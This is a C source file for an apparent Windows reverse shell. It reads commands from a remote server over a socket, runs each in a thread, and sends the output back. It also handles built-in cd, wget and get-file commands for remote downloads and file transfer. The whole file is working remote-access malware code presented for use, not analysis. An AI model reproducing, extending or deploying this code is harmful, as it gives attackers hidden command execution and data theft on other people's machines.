#include "../header/reverse.h"

int is_command(char * cmd)
{
    if(my_strcmp(cmd, "exit\n"))
        return 1;
    if(cmd[0] == 'c' && cmd[1] == 'd' && cmd[2] == ' ')
        return 1;
    if(cmd[0] == 'w' && cmd[1] == 'g' && cmd[2] == 'e' && cmd[3] == 't' && cmd[4] == ' ')
        return 1;
    if(cmd[0] == 'g' && cmd[1] == 'e' && cmd[2] == 't' && cmd[3] == '-' && cmd[4] == 'f' && cmd[5] == 'i' && cmd[6] == 'l' && cmd[7] == 'e' && cmd[8] == ' ')
        return 1;
    return 0;
}

DWORD WINAPI command_handler(void *inf)
{
    struct main_struct * m_s = (struct main_struct*)inf;
                                                 // retreive the struct pointer

    if(is_command(m_s->cmd) == 1) {
        process_command(m_s);
    } else {
        if(exe(m_s) != 0) {                     // execute the given command.
            m_s->buf = malloc(1024 * sizeof(char));
            sprintf(m_s->buf, "Error: type exit to reboot the connection");
        }
        if(strlen(m_s->buf) < 2) {             // if there is no utput dont make the server crash
            sprintf(m_s->buf, "....");
        }
        sender(m_s->s, m_s->buf, strlen(m_s->buf), &m_s->cn);		// send output
    }
    free(m_s->buf);                       // free the allocated output.
    return 0;
}

int reverse_shell(struct main_struct *m_s)
{
    HANDLE command_thread;                          // create the thread

    while(m_s->cn != SOCKET_ERROR) {                // while connected
        m_s->cmd = malloc(1024 * sizeof(char));     // allocate memory for the buffer
        receiver(m_s->s, m_s->cmd, 1024, &m_s->cn);
        #ifdef _DEBUG
            debug(m_s);
        #endif
        command_thread = CreateThread(NULL, 0, command_handler, (void *)m_s, 0, NULL);
        if(command_thread){         // create thread and check its existance
            sleep(1);               // wait for 1 second for cmd to process after reading again.
                                    // this part should be a wait for thread
        }
    }
    return 0;
}
